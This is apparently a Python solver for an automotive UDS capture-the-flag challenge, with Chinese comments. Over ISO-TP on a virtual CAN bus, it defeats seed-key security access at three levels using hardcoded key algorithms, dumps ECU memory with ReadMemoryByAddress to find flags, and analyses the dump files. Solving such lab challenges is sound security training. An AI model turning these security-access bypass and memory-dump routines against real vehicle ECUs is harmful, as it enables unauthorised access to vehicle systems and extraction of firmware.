#!/usr/bin/env python3
import isotp
import struct
import time

def calc_key_level5(seed):
    # 级别5密钥算法 - 与服务器端一致
    key = seed
    
    # 步骤1: 多重异或
    key ^= 0x12345678
    key ^= 0x87654321
    
    # 步骤2: 循环右移
    key = (key >> 13) | (key << 19)
    
    # 步骤3: 位运算
    key = (key & 0xFF00FF00) | ((key & 0x00FF00FF) ^ 0x55555555)
    
    # 步骤4: 加法运算
    key += 0xDEADBEEF
    
    # 步骤5: 最终异或
    key ^= 0xCAFEBABE
    
    return key & 0xFFFFFFFF

def dump_memory(s, start_addr, size, step=0x50, output_file="memory_dump.bin"):
    """dump内存并寻找flag，同时保存到文件"""
    print(f"开始dump内存: 0x{start_addr:08X} - 0x{start_addr+size:08X}")
    print(f"内存数据将保存到: {output_file}")
    
    found_flags = []
    current_addr = start_addr
    
    # 限制地址范围，避免访问无效内存
    max_addr = 0x7FFFFFFF  # 最大允许地址（32位地址空间）
    if start_addr + size > max_addr:
        size = max_addr - start_addr
        print(f"调整dump大小到: 0x{size:08X}")
    
    # 创建输出文件
    with open(output_file, 'wb') as f:
        while current_addr < start_addr + size:
            # 计算本次读取大小（确保不超过单帧限制）
            read_size = min(step, start_addr + size - current_addr)
            
            # 检查地址是否在有效范围内
            if current_addr >= max_addr:
                print(f"地址超出范围: 0x{current_addr:08X}，停止dump")
                break
            
            # 使用标准UDS ReadMemoryByAddress格式
            # 格式标识符: 0x14 表示1字节大小 + 4字节地址
            # 地址: 4字节，大端序
            # 大小: 1字节
            addr_bytes = struct.pack('>I', current_addr)  # 4字节地址，大端序
            size_bytes = struct.pack('>B', read_size & 0xFF)  # 1字节大小
            
            # 构造请求数据: 0x23 + 0x14 + 地址(4字节) + 大小(1字节) = 7字节
            request_data = bytes([0x23, 0x14]) + addr_bytes + size_bytes
            print(f"请求: 0x{current_addr:08X}, 大小{read_size}")
            print(f"请求数据: {' '.join([f'{b:02X}' for b in request_data])}")
            
            try:
                # 发送请求
                s.send(request_data)
                
                # 接收响应
                response = s.recv()
                
                if response and response[0] == 0x63:
                    # 解析内存数据
                    memory_data = response[2:]  # 跳过0x63和格式标识符
                    
                    # 直接写入内存数据，不写入额外信息
                    f.write(memory_data)
                    
                    # 在内存数据中寻找flag
                    try:
                        data_str = memory_data.decode('utf-8', errors='ignore')
                        if 'CTF{' in data_str:
                            # 找到flag
                            start_idx = data_str.find('CTF{')
                            end_idx = data_str.find('}', start_idx)
                            if end_idx != -1:
                                flag = data_str[start_idx:end_idx+1]
                                found_flags.append((current_addr, flag))
                                print(f"找到flag: {flag} (地址: 0x{current_addr:08X})")
                    except:
                        pass
                    
                    # 打印前16字节的十六进制
                    if len(memory_data) > 0:
                        hex_data = ' '.join([f"{b:02X}" for b in memory_data[:16]])
                        print(f"0x{current_addr:08X}: {hex_data}")
                        
                        # 检查是否全是零（可能表示无效内存）
                        if all(b == 0 for b in memory_data[:16]):
                            print(f"警告: 地址 0x{current_addr:08X} 返回全零数据，可能无效")
                else:
                    # 如果读取失败，写入零数据
                    print(f"读取地址 0x{current_addr:08X} 失败，写入零数据")
                    f.write(b'\x00' * read_size)
                
            except Exception as e:
                print(f"读取地址 0x{current_addr:08X} 时出错: {e}")
                # 写入零数据
                f.write(b'\x00' * read_size)
            
            current_addr += read_size
            time.sleep(0.01)  # 小延迟避免过快
    
    print(f"内存dump完成，数据已保存到: {output_file}")
    return found_flags

def get_flags():
    # 使用isotp.socket()而不是can.interface.Bus
    s = isotp.socket()
    
    # 设置isotp参数，确保多帧传输正常工作（必须在bind之前设置）
    s.set_fc_opts(stmin=0, bs=0)  # 设置流控参数
    
    s.bind('vcan0', isotp.Address(rxid=0x7e8, txid=0x7e0))
    
    print("获取UDS CTF flags...")
    
    # 1. 公开flag
    print("\n[1] 获取公开flag...")
    s.send(bytes([0x22, 0xF1, 0x90]))
    response = s.recv()
    if response and response[0] == 0x62:
        flag = response[3:].decode('utf-8', errors='ignore')
        print(f"公开flag: {flag}")
    
    # 2. 安全flag (级别1)
    print("\n[2] 获取安全flag...")
    # 请求seed
    s.send(bytes([0x27, 0x01]))
    response = s.recv()
    if response and response[0] == 0x67:
        seed = response[2:6]  # 跳过0x67和0x01
        if seed != b'\0\0\0\0':
            key_val = struct.unpack('>I', seed)[0] ^ 0xdeadbeef
            key = struct.pack('>I', key_val)
            # 发送key
            s.send(bytes([0x27, 0x02]) + key)
            response = s.recv()
            if response and response[0] == 0x67:
                # 读取安全flag
                s.send(bytes([0x22, 0xC1, 0xC2]))
                response = s.recv()
                if response and response[0] == 0x62:
                    flag = response[3:].decode('utf-8', errors='ignore')
                    print(f"安全flag: {flag}")
    
    # 3. 高级flag (级别3)
    print("\n[3] 获取高级flag...")
    # 切换到编程会话
    s.send(bytes([0x10, 0x02]))
    s.recv()
    # 请求级别3 seed
    s.send(bytes([0x27, 0x03]))
    response = s.recv()
    if response and response[0] == 0x67:
        seed = response[2:6]
        if seed != b'\0\0\0\0':
            # 计算级别3 key
            key_val = struct.unpack('>I', seed)[0]
            key_val = ((key_val << 7) | (key_val >> 25)) & 0xFFFFFFFF
            key_val ^= 0xCAFEBABE
            key_val = (key_val + 0x12345678) & 0xFFFFFFFF
            key_val = (key_val & 0xFFFF0000) | ((key_val & 0x0000FFFF) ^ 0xABCD)
            key_val ^= 0xDEADBEEF
            # 发送级别3 key
            key = struct.pack('>I', key_val)
            s.send(bytes([0x27, 0x04]) + key)
            response = s.recv()
            if response and response[0] == 0x67:
                # 读取高级flag
                s.send(bytes([0x22, 0xD1, 0xD2]))
                response = s.recv()
                if response and response[0] == 0x62:
                    flag = response[3:].decode('utf-8', errors='ignore')
                    print(f"高级flag: {flag}")
    
    # 4. 内存dump (级别5)
    print("\n[4] 获取内存flag...")
    # 请求级别5 seed
    s.send(bytes([0x27, 0x05]))
    response = s.recv()
    if response and response[0] == 0x67:
        seed = response[2:6]
        if seed != b'\0\0\0\0':
            # 计算级别5 key
            key_val = struct.unpack('>I', seed)[0]
            key_val = calc_key_level5(key_val)
            # 发送级别5 key
            key = struct.pack('>I', key_val)
            s.send(bytes([0x27, 0x06]) + key)
            response = s.recv()
            if response and response[0] == 0x67:
                print("级别5安全访问成功")
                
                # 开始内存dump，寻找flag
                # 从程序基址开始dump，使用较小的读取大小避免多帧
                print("\n开始内存dump...")
                found_flags = dump_memory(s, 0x40000000, 0x20000, 0x50, "uds_memory_dump.bin")  # dump 64KB，每次读取80字节
                
                if found_flags:
                    print(f"\n找到 {len(found_flags)} 个flag:")
                    for addr, flag in found_flags:
                        print(f"  地址 0x{addr:08X}: {flag}")
                else:
                    print("未找到内存中的flag")
                    
    # 5. 启动flag (监听)
    print("\n[5] 监听启动flag...")
    s.send(bytes([0x11, 0x01]))
    # 启动flag通常在服务器启动时发送，这里尝试接收
    try:
        s.settimeout(10.0)  # 设置10秒超时
        response = s.recv()
        if response and len(response) > 4:
            flag_data = response[3:]
            try:
                flag = flag_data.decode('utf-8', errors='ignore')
                if 'CTF{' in flag:
                    print(f"启动flag: {flag}")
            except:
                pass
    except:
        print("启动flag监听超时")
    
    s.close()

def convert_dump_to_hex(input_file, output_file):
    """将内存dump文件转换为十六进制格式，方便查看"""
    print(f"将 {input_file} 转换为十六进制格式: {output_file}")
    
    try:
        with open(input_file, 'rb') as f_in, open(output_file, 'w') as f_out:
            # 读取整个文件数据
            memory_data = f_in.read()
            
            f_out.write(f"# 内存dump文件: {input_file}\n")
            f_out.write(f"# 文件大小: {len(memory_data)} 字节\n")
            f_out.write("# 格式: 偏移 十六进制数据 ASCII数据\n")
            f_out.write("#" + "="*80 + "\n")
            
            # 按16字节一行输出
            for i in range(0, len(memory_data), 16):
                offset = i
                chunk = memory_data[i:i+16]
                
                # 转换为十六进制
                hex_data = ' '.join([f"{b:02X}" for b in chunk])
                hex_data = hex_data.ljust(47)  # 补齐到47个字符
                
                # 转换为ASCII（不可打印字符用点代替）
                ascii_data = ''.join([chr(b) if 32 <= b <= 126 else '.' for b in chunk])
                
                # 写入文件
                f_out.write(f"0x{offset:08X}: {hex_data} |{ascii_data}|\n")
        
        print(f"转换完成: {output_file}")
        
    except FileNotFoundError:
        print(f"文件 {input_file} 不存在")
    except Exception as e:
        print(f"转换文件时出错: {e}")

def analyze_memory_dump(filename):
    """分析保存的内存dump文件"""
    print(f"分析内存dump文件: {filename}")
    
    try:
        with open(filename, 'rb') as f:
            found_flags = []
            total_bytes = 0
            
            # 读取整个文件数据
            memory_data = f.read()
            total_bytes = len(memory_data)
            
            print(f"文件大小: {total_bytes} 字节")
            
            # 在数据中寻找flag
            try:
                data_str = memory_data.decode('utf-8', errors='ignore')
                if 'CTF{' in data_str:
                    # 找到所有flag
                    start_pos = 0
                    while True:
                        start_idx = data_str.find('CTF{', start_pos)
                        if start_idx == -1:
                            break
                        end_idx = data_str.find('}', start_idx)
                        if end_idx != -1:
                            flag = data_str[start_idx:end_idx+1]
                            found_flags.append((start_idx, flag))
                            print(f"找到flag: {flag} (位置: {start_idx})")
                        start_pos = start_idx + 1
            except:
                pass
            
            # 搜索ELF头
            if len(memory_data) >= 4 and memory_data[:4] == b'\x7FELF':
                print(f"找到ELF头: 位置 0")
                print(f"  ELF头: {' '.join([f'{b:02X}' for b in memory_data[:16]])}")
            
            # 搜索其他模式
            if len(memory_data) >= 4:
                # 搜索字符串
                if b'.text' in memory_data or b'.data' in memory_data or b'.bss' in memory_data:
                    print(f"找到节名")
                
                # 搜索函数名
                if b'main' in memory_data or b'printf' in memory_data or b'malloc' in memory_data:
                    print(f"找到函数名")
            
            print(f"分析完成，总共处理了 {total_bytes} 字节")
            
            if found_flags:
                print(f"\n在dump文件中找到 {len(found_flags)} 个flag:")
                for pos, flag in found_flags:
                    print(f"  位置 {pos}: {flag}")
            else:
                print("在dump文件中未找到flag")
                
    except FileNotFoundError:
        print(f"文件 {filename} 不存在")
    except Exception as e:
        print(f"分析文件时出错: {e}")

def search_elf_patterns(filename):
    """在dump文件中搜索ELF头和特定模式"""
    print(f"在 {filename} 中搜索ELF模式和特定结构...")
    
    try:
        with open(filename, 'rb') as f:
            # 读取整个文件数据
            memory_data = f.read()
            print(f"文件大小: {len(memory_data)} 字节")
            
            elf_headers = []
            flag_patterns = []
            
            # 搜索ELF头 (0x7F 0x45 0x4C 0x46)
            if len(memory_data) >= 4 and memory_data[:4] == b'\x7FELF':
                elf_headers.append((0, memory_data[:16]))
                print(f"找到ELF头: 位置 0")
                print(f"  ELF头: {' '.join([f'{b:02X}' for b in memory_data[:16]])}")
            
            # 搜索其他常见模式
            if len(memory_data) >= 4:
                # 搜索字符串表
                if b'.text' in memory_data or b'.data' in memory_data or b'.bss' in memory_data:
                    print(f"找到节名")
                
                # 搜索函数名
                if b'main' in memory_data or b'printf' in memory_data or b'malloc' in memory_data:
                    print(f"找到函数名")
                
                # 搜索flag模式
                if b'CTF{' in memory_data:
                    flag_patterns.append((0, memory_data))
                    print(f"找到flag模式")
            
            print(f"\n搜索完成")
            print(f"找到ELF头: {len(elf_headers)} 个")
            print(f"找到flag模式: {len(flag_patterns)} 个")
            
            if elf_headers:
                print("\nELF头详情:")
                for pos, header_data in elf_headers:
                    print(f"  位置 {pos}: {' '.join([f'{b:02X}' for b in header_data])}")
            
            if flag_patterns:
                print("\nFlag模式详情:")
                for pos, data in flag_patterns:
                    try:
                        data_str = data.decode('utf-8', errors='ignore')
                        if 'CTF{' in data_str:
                            start_idx = data_str.find('CTF{')
                            end_idx = data_str.find('}', start_idx)
                            if end_idx != -1:
                                flag = data_str[start_idx:end_idx+1]
                                print(f"  位置 {pos}: {flag}")
                    except:
                        pass
                
    except FileNotFoundError:
        print(f"文件 {filename} 不存在")
    except Exception as e:
        print(f"搜索文件时出错: {e}")

def merge_elf_dumps(output_file="uds_complete_elf.bin"):
    """合并所有ELF dump文件为一个完整的文件"""
    print(f"合并所有ELF dump文件到: {output_file}")
    
    elf_files = [
        "uds_elf_text.bin", "uds_elf_data.bin", "uds_elf_bss.bin",
        "uds_elf_heap.bin", "uds_elf_stack.bin", "uds_elf_other.bin",
        "uds_elf_ext1.bin", "uds_elf_ext2.bin", "uds_elf_ext3.bin", "uds_elf_ext4.bin",
        "uds_elf_ext5.bin", "uds_elf_ext6.bin", "uds_elf_ext7.bin", "uds_elf_ext8.bin",
        "uds_elf_mmap1.bin", "uds_elf_mmap2.bin", "uds_elf_mmap3.bin", "uds_elf_mmap4.bin",
        "uds_elf_kernel1.bin", "uds_elf_kernel2.bin"
    ]
    
    with open(output_file, 'wb') as out_f:
        total_size = 0
        successful_merges = 0
        
        for elf_file in elf_files:
            try:
                with open(elf_file, 'rb') as in_f:
                    # 直接复制所有数据
                    data = in_f.read()
                    out_f.write(data)
                    total_size += len(data)
                    successful_merges += 1
                    print(f"合并 {elf_file}: {len(data)} 字节")
                    
            except FileNotFoundError:
                print(f"文件 {elf_file} 不存在，跳过")
            except Exception as e:
                print(f"合并 {elf_file} 时出错: {e}")
    
    print(f"合并完成！")
    print(f"成功合并: {successful_merges}/{len(elf_files)} 个文件")
    print(f"总大小: {total_size} 字节")
    print(f"输出文件: {output_file}")

if __name__ == "__main__":
    get_flags()
    
    # 分析保存的dump文件
    print("\n" + "="*50)
    print("分析保存的内存dump文件...")
    
    # 基础dump文件
    analyze_memory_dump("uds_memory_dump.bin")
    analyze_memory_dump("uds_full_dump.bin")
    
    # ELF dump文件
    elf_files = [
        "uds_elf_text.bin", "uds_elf_data.bin", "uds_elf_bss.bin",
        "uds_elf_heap.bin", "uds_elf_stack.bin", "uds_elf_other.bin",
        "uds_elf_ext1.bin", "uds_elf_ext2.bin", "uds_elf_ext3.bin", "uds_elf_ext4.bin",
        "uds_elf_ext5.bin", "uds_elf_ext6.bin", "uds_elf_ext7.bin", "uds_elf_ext8.bin",
        "uds_elf_mmap1.bin", "uds_elf_mmap2.bin", "uds_elf_mmap3.bin", "uds_elf_mmap4.bin",
        "uds_elf_kernel1.bin", "uds_elf_kernel2.bin"
    ]
    
    # ELF段文件
    elf_segment_files = [
        "uds_elf_header.bin", "uds_elf_phdr.bin", "uds_elf_shdr.bin",
        "uds_elf_text_segment.bin", "uds_elf_data_segment.bin", "uds_elf_bss_segment.bin",
        "uds_elf_rodata_segment.bin", "uds_elf_got_segment.bin", "uds_elf_plt_segment.bin",
        "uds_elf_strtab_segment.bin", "uds_elf_symtab_segment.bin", "uds_elf_dynamic_segment.bin",
        "uds_elf_stack_segment.bin", "uds_elf_heap_segment.bin"
    ]
    
    # 分析ELF dump文件
    for elf_file in elf_files:
        try:
            analyze_memory_dump(elf_file)
        except FileNotFoundError:
            print(f"文件 {elf_file} 不存在，跳过")
        except Exception as e:
            print(f"分析 {elf_file} 时出错: {e}")
    
    # 分析ELF段文件
    for elf_segment_file in elf_segment_files:
        try:
            analyze_memory_dump(elf_segment_file)
        except FileNotFoundError:
            print(f"文件 {elf_segment_file} 不存在，跳过")
        except Exception as e:
            print(f"分析 {elf_segment_file} 时出错: {e}")
    
    # 转换为十六进制格式
    print("\n" + "="*50)
    print("转换为十六进制格式...")
    
    # 基础文件转换
    convert_dump_to_hex("uds_memory_dump.bin", "uds_memory_dump.hex")
    convert_dump_to_hex("uds_full_dump.bin", "uds_full_dump.hex")
    
    # ELF文件转换
    for elf_file in elf_files:
        try:
            hex_file = elf_file.replace('.bin', '.hex')
            convert_dump_to_hex(elf_file, hex_file)
        except FileNotFoundError:
            print(f"文件 {elf_file} 不存在，跳过转换")
        except Exception as e:
            print(f"转换 {elf_file} 时出错: {e}")
    
    # ELF段文件转换
    for elf_segment_file in elf_segment_files:
        try:
            hex_file = elf_segment_file.replace('.bin', '.hex')
            convert_dump_to_hex(elf_segment_file, hex_file)
        except FileNotFoundError:
            print(f"文件 {elf_segment_file} 不存在，跳过转换")
        except Exception as e:
            print(f"转换 {elf_segment_file} 时出错: {e}")
    
    # 合并ELF dump文件
    print("\n" + "="*50)
    print("合并ELF dump文件...")
    merge_elf_dumps()
    
    # 搜索ELF模式和特定模式
    print("\n" + "="*50)
    print("搜索ELF模式和特定模式...")
    search_elf_patterns("uds_memory_dump.bin")
    search_elf_patterns("uds_full_dump.bin")
    for elf_file in elf_files:
        try:
            search_elf_patterns(elf_file)
        except FileNotFoundError:
            print(f"文件 {elf_file} 不存在，跳过搜索")
        except Exception as e:
            print(f"搜索 {elf_file} 时出错: {e}")
    
    print("\n所有操作完成！生成的文件:")
    print("- uds_memory_dump.bin/.hex: 基础内存dump文件")
    print("- uds_full_dump.bin/.hex: 完整内存dump文件")
    print("- uds_elf_*.bin/.hex: 各个ELF段的dump文件")
    print("- uds_elf_*_segment.bin/.hex: 基于ELF格式的段文件")
    print("- uds_complete_elf.bin: 合并后的完整ELF内存dump")
    print("- 总共生成约50个文件，覆盖整个ELF内存空间") 